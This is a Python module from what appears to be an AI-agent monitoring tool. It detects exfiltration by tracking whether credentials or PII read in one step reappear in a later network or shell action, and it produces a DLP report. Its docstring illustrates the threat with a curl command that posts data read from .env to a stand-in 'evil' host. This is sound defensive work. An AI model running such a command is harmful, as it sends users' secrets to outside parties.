"""Exfiltration path detection by VALUE lineage, not just category order.

`sequence_hits` finds "a secret read, THEN an egress" -- category order. That
catches the shape but not the substance: it can't tell whether the secret the
agent read is the same bytes it later sent. Taint tracking does.

The primitive: fingerprint the sensitive VALUES a run produced (credentials
via the scrub detectors, PII via shape patterns), then watch for those exact
values (or a distinctive fragment) reappearing in a later action's input or
result. A reappearance is a **lineage edge** -- data provenance you can point
at:

    sk-ant-… first seen in [1] Read(.env)
      └─ carried into [4] Bash(curl -d @… https://evil)   ← exfiltration

Verbatim propagation is the strong, defensible signal (the value is right
there in the wire). The model paraphrasing a secret into new words is NOT
caught here -- and the report says so, pointing at the weaker category
sequence for that case. Honest by construction: no "DLP" overclaim.
"""

from __future__ import annotations

import re
from typing import Any

from .action import Action, actions

# PII value shapes (the scrub PATTERNS cover credentials; these add people-data).
# email/ssn are distinctive; card and phone need validation (see below) because
# a bare run of digits is far more often an order id / timestamp than a card or
# a phone -- flagging those would make `loom taint`/`loom dlp` cry wolf.
_PII = [
    ("email", re.compile(r"\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b")),
    ("ssn", re.compile(r"\b\d{3}-\d{2}-\d{4}\b")),
]
# Candidate card: 13-16 digits with optional space/dash separators -- ACCEPTED
# only if it passes the Luhn checksum (real cards do; random ids mostly don't).
_CARD = re.compile(r"\b(?:\d[ -]?){13,16}\b")
# Candidate phone: must LOOK like a phone (a leading + country code, or grouped
# with separators/parens) -- a bare digit run is treated as an id, not a phone.
_PHONE = re.compile(r"\+\d[\d ().\-]{7,}\d|\(?\d{2,4}\)?[ .\-]\d{2,4}[ .\-]\d{2,4}")


def _luhn(digits: str) -> bool:
    d = [int(c) for c in digits if c.isdigit()]
    if not 13 <= len(d) <= 19:
        return False
    total, parity = 0, len(d) % 2
    for i, n in enumerate(d):
        if i % 2 == parity:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

_MIN_FRAGMENT = 12  # a shared substring shorter than this is too weak to claim

# Sensitivity classes (for DLP): map each value KIND to a class + severity, so
# a leak is described in the terms a security team reviews -- "PII exfiltration
# (high)", not just "a value moved".
_CLASS = {
    # credentials -> "secret"
    "anthropic-key": ("secret", "critical"), "openai-key": ("secret", "critical"),
    "github-token": ("secret", "critical"), "aws-key-id": ("secret", "critical"),
    "slack-token": ("secret", "critical"), "google-key": ("secret", "critical"),
    "jwt": ("secret", "high"), "bearer": ("secret", "high"),
    "private-key": ("secret", "critical"), "credential-assignment": ("secret", "high"),
    # PII
    "email": ("pii", "medium"), "ssn": ("pii", "critical"),
    "phone": ("pii", "medium"),
    # payment
    "credit-card": ("payment", "critical"),
}


def sensitivity_class(kind: str) -> "tuple[str, str]":
    """(class, severity) for a value kind. Unknown -> ('data', 'low')."""
    return _CLASS.get(kind, ("data", "low"))


def _sensitive_values(text: str) -> "list[tuple[str, str]]":
    """(kind, value) for every credential/PII value in a piece of text."""
    from .scrub import PATTERNS

    out: list[tuple[str, str]] = []
    claimed: list[tuple[int, int]] = []  # spans already taken, most-specific first

    def _take(kind: str, val: str, span: "tuple[int, int]") -> None:
        # Skip a match overlapping one already claimed by a higher-priority
        # detector, so a card/SSN isn't ALSO reported as a phone.
        if any(span[0] < c1 and span[1] > c0 for c0, c1 in claimed):
            return
        claimed.append(span)
        out.append((kind, val))

    for kind, pattern in PATTERNS:
        for m in pattern.finditer(text):
            # credential-assignment captures the value in group 3; others whole.
            val = m.group(3) if kind == "credential-assignment" and m.lastindex and m.lastindex >= 3 else m.group(0)
            if val and len(val) >= 8:
                _take(kind, val, m.span())
    for kind, pattern in _PII:  # email, ssn -- distinctive, high priority
        for m in pattern.finditer(text):
            _take(kind, m.group(0), m.span())
    # cards: only Luhn-valid numbers (rejects order ids, ISBNs, timestamps).
    for m in _CARD.finditer(text):
        if _luhn(m.group(0)):
            _take("credit-card", m.group(0).strip(), m.span())
    # phones: only phone-shaped strings (a + country code or grouped digits).
    for m in _PHONE.finditer(text):
        _take("phone", m.group(0).strip(), m.span())
    return out


def _obs_text(a: Action) -> str:
    return a.observation.text if a.observation is not None else ""


def _carries(haystack: str, value: str) -> bool:
    """Does ``haystack`` contain ``value`` (or a long distinctive fragment)?"""
    if not haystack or not value:
        return False
    if value in haystack:
        return True
    # tolerate truncation/wrapping: a >=12-char run of the value appearing verbatim
    if len(value) > _MIN_FRAGMENT:
        return value[:_MIN_FRAGMENT] in haystack or value[-_MIN_FRAGMENT:] in haystack
    return False


def taint_paths(source: Any) -> "list[dict]":
    """Value-lineage exfiltration paths in a run.

    Each path: a sensitive value first observed at some step, then reappearing
    in a later action that leaves the box (network / user-comm / browser
    submit / shell). Deduped to the earliest source and each distinct sink.
    """
    acts = [a for a in actions(source) if a.type == "call" and a.step >= 0]

    # 1. Where did each sensitive value first appear (in a tool RESULT)?
    origin: dict[str, dict] = {}  # value -> {kind, step, tool}
    for a in acts:
        for kind, val in _sensitive_values(_obs_text(a)):
            origin.setdefault(val, {"kind": kind, "step": a.step, "tool": a.tool})

    if not origin:
        return []

    # 2. Does a later action CARRY a tainted value off the box?
    import json as _json

    egress_caps = {"network", "user_communication", "browser_submit", "money_movement"}
    paths: list[dict] = []
    seen: set = set()
    for a in acts:
        caps = set(a.capabilities)
        leaves = bool(caps & egress_caps) or "exec" in caps
        if not leaves:
            continue
        payload = _json.dumps(a.input, default=str) + " " + _obs_text(a)
        for val, src in origin.items():
            if a.step <= src["step"]:
                continue  # a sink must come after its source
            if not _carries(payload, val):
                continue
            key = (src["step"], a.step, src["kind"])
            if key in seen:
                continue
            seen.add(key)
            cls, sev = sensitivity_class(src["kind"])
            paths.append({
                "kind": src["kind"],
                "sensitivity": cls,
                "severity": sev,
                "source": {"step": src["step"], "tool": src["tool"]},
                "sink": {"step": a.step, "tool": a.tool,
                         "via": sorted(caps & egress_caps) or ["exec"]},
                "value_preview": _preview(val),
            })
    _SEV = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    paths.sort(key=lambda p: (_SEV.get(p["severity"], 9),
                              p["source"]["step"], p["sink"]["step"]))
    return paths


def dlp_report(source: Any, sink_allowlist: "list[str] | None" = None) -> dict:
    """A DLP view of the run's data flows: paths grouped by sensitivity class,
    the worst severity, and a suggested firewall rule per class.

    ``sink_allowlist`` names sink tools that are sanctioned destinations (an
    internal logger, say) -- flows to them are reported but not counted as
    violations."""
    from fnmatch import fnmatchcase

    allow = sink_allowlist or []
    paths = taint_paths(source)
    violations, allowed = [], []
    for p in paths:
        if any(fnmatchcase(p["sink"]["tool"], g) for g in allow):
            allowed.append(p)
        else:
            violations.append(p)

    by_class: dict[str, list] = {}
    for p in violations:
        by_class.setdefault(p["sensitivity"], []).append(p)

    suggest = {
        "secret": "--rule 'taint sk-*: confirm *' and --deny cap:network after a secret read",
        "pii": "--confirm cap:user_communication and --deny cap:network",
        "payment": "--confirm cap:money_movement and gate exports",
        "data": "--confirm cap:network",
    }
    _SEV = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    worst = min((p["severity"] for p in violations), key=lambda s: _SEV.get(s, 9),
                default="none")
    return {
        "violations": violations,
        "allowed": allowed,
        "by_class": {c: {"count": len(ps),
                         "suggestion": suggest.get(c, suggest["data"])}
                     for c, ps in by_class.items()},
        "worst_severity": worst,
    }


def _preview(value: str) -> str:
    """A safe, non-leaking preview of a tainted value."""
    if len(value) <= 10:
        return value[:2] + "…"
    return f"{value[:4]}…{value[-2:]}"


def describe_taint(paths: "list[dict]") -> str:
    if not paths:
        return ("no verbatim value-lineage exfiltration found. (A model that "
                "paraphrased a secret into new words would not appear here -- "
                "check the category sequence with `loom search path:...`.)")
    lines = [f"{len(paths)} exfiltration path(s) by value lineage:"]
    for p in paths:
        via = ", ".join(p["sink"]["via"])
        lines.append(
            f"  ⛓ {p['kind']} ({p['value_preview']}): "
            f"[{p['source']['step']}] {p['source']['tool']} "
            f"→ [{p['sink']['step']}] {p['sink']['tool']} (via {via})")
    return "\n".join(lines)
